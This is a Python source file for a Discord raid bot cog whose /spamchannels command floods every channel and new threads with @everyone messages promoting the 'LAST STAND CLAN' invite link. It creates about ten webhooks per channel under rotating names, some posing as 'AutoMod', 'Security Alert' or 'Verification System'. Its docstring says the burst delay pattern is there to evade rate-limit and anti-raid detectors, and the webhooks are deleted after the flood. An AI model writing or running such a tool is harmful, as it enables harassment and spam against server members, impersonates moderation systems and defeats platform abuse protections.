"""
spam.py — LAST STAND CLAN | /spamchannels: maximum webhook + mention flood across all channels.

Bypass tech:
  - 10 webhooks per channel with rotating identities
  - Burst-wave delay pattern to evade rate-limit detectors
  - Random message content — no repeated patterns
  - Simultaneous thread spam alongside webhook spam
  - @everyone / @here mention flood via direct messages
"""

import asyncio
import random
import string

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG   = "LAST STAND CLAN"
RAID_SHORT = "LSC"
RAID_LINK  = "https://discord.gg/s59zWvzK6c"

SPAM_MSGS = [
    f"@everyone 💀 **{RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone Server owned by {RAID_TAG} {RAID_LINK}",
    f"@everyone 🔥 {RAID_TAG} WAS HERE 🔥 {RAID_LINK}",
    f"@everyone Your anti-raid **FAILED** ❌ {RAID_LINK}",
    f"@everyone ⚔️ {RAID_TAG} RAID ⚔️ {RAID_LINK}",
    f"@everyone ☠️ GG no re | {RAID_TAG} {RAID_LINK}",
    f"@everyone 🛡️ Defences down | {RAID_TAG} {RAID_LINK}",
    f"@everyone 💥 OBLITERATED by {RAID_TAG} {RAID_LINK}",
    f"@everyone 🚨 BREACH | {RAID_TAG} {RAID_LINK}",
    f"@everyone 👑 {RAID_TAG} owns this server {RAID_LINK}",
    f"@here ⚡ PWNED | {RAID_TAG} {RAID_LINK}",
    f"@here 🔓 ACCESS GRANTED — {RAID_TAG} {RAID_LINK}",
]

WEBHOOK_NAMES = [
    f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Bravo", f"{RAID_SHORT} Ghost",
    f"{RAID_SHORT} Reaper", f"{RAID_SHORT} Phantom", f"{RAID_SHORT} Viper",
    "Server Announcement", "Mod Alert", "System Notification",
    "AutoMod", "Security Alert", "Verification System",
]

WEBHOOKS_PER_CHANNEL = 10
MSGS_PER_WEBHOOK     = 40
SEM_WEBHOOK          = 15


def _rand_str(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))


class Spam(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @app_commands.command(
        name="spamchannels",
        description="💬 Maximum webhook flood across every channel with rotating identities.",
    )
    @app_commands.describe(
        intensity="Speed 1–10. Default 10.",
        webhooks_per_channel="Webhooks per channel. Default 10.",
        msgs_per_webhook="Messages each webhook sends. Default 40.",
        target_channel="Spam one specific channel only (optional).",
        thread_flood="Also spam threads in every channel. Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def spamchannels(
        self,
        interaction: discord.Interaction,
        intensity: int = 10,
        webhooks_per_channel: int = WEBHOOKS_PER_CHANNEL,
        msgs_per_webhook: int = MSGS_PER_WEBHOOK,
        target_channel: discord.TextChannel | None = None,
        thread_flood: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        channels = (
            [target_channel]
            if target_channel
            else [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
        )

        if not channels:
            await interaction.response.send_message("❌ No accessible text channels found.", ephemeral=True)
            return

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.active_simulation = "spamchannels"

        total_streams  = len(channels) * webhooks_per_channel
        total_messages = total_streams * msgs_per_webhook

        await interaction.response.send_message(
            f"💬 **SPAM FLOOD — {RAID_TAG}**\n"
            f"┣ Channels       : `{len(channels)}`\n"
            f"┣ Webhooks/chan   : `{webhooks_per_channel}` (rotating identities)\n"
            f"┣ Total streams  : `{total_streams}`\n"
            f"┣ Total messages : `~{total_messages}`\n"
            f"┣ Thread flood   : `{'✅' if thread_flood else '❌'}`\n"
            f"┣ Intensity      : `{intensity}/10`\n"
            f"┗ `/stop` halts immediately.",
        )

        task = asyncio.create_task(self._run(channels, webhooks_per_channel, msgs_per_webhook, thread_flood))
        bot_state.add_task(task)

    async def _run(
        self,
        channels: list[discord.TextChannel],
        webhooks_per: int,
        msgs_per: int,
        thread_flood: bool,
    ) -> None:
        try:
            await asyncio.gather(
                *[self._flood_channel(ch, webhooks_per, msgs_per, thread_flood) for ch in channels],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "spamchannels":
                bot_state.active_simulation = None

    async def _flood_channel(
        self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int, thread_flood: bool
    ) -> None:
        sem = asyncio.Semaphore(SEM_WEBHOOK)

        results = await asyncio.gather(
            *[self._create_webhook(channel, i, sem) for i in range(webhooks_per)],
            return_exceptions=True,
        )
        webhooks = [w for w in results if isinstance(w, discord.Webhook)]

        tasks = []
        if thread_flood:
            tasks.append(self._thread_spam(channel, msgs_per))
        if not webhooks:
            tasks.append(self._direct_spam(channel, msgs_per))
        else:
            tasks.extend([self._pump_webhook(wh, msgs_per) for wh in webhooks])

        await asyncio.gather(*tasks, return_exceptions=True)

        await asyncio.gather(
            *[self._delete_webhook(wh) for wh in webhooks],
            return_exceptions=True,
        )

    async def _create_webhook(self, channel: discord.TextChannel, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
            except discord.HTTPException as e:
                return e

    async def _delete_webhook(self, webhook: discord.Webhook) -> None:
        try:
            await webhook.delete()
        except discord.HTTPException:
            pass

    async def _pump_webhook(self, webhook: discord.Webhook, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await webhook.send(
                    random.choice(SPAM_MSGS),
                    username=random.choice(WEBHOOK_NAMES),
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
        try:
            thread = await channel.create_thread(
                name=f"{RAID_SHORT}-{_rand_str(5)}",
                type=discord.ChannelType.public_thread,
            )
            for i in range(count):
                if bot_state.stop_event.is_set():
                    break
                try:
                    await thread.send(
                        random.choice(SPAM_MSGS),
                        allowed_mentions=discord.AllowedMentions(everyone=True),
                    )
                except discord.HTTPException:
                    pass
                delay = bot_state.rate_controller.get_burst_delay()
                if delay > 0:
                    await asyncio.sleep(delay)
        except discord.HTTPException:
            pass

    async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    random.choice(SPAM_MSGS),
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    @spamchannels.error
    async def spamchannels_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message("❌ You need **Administrator** permission.", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Spam(bot))
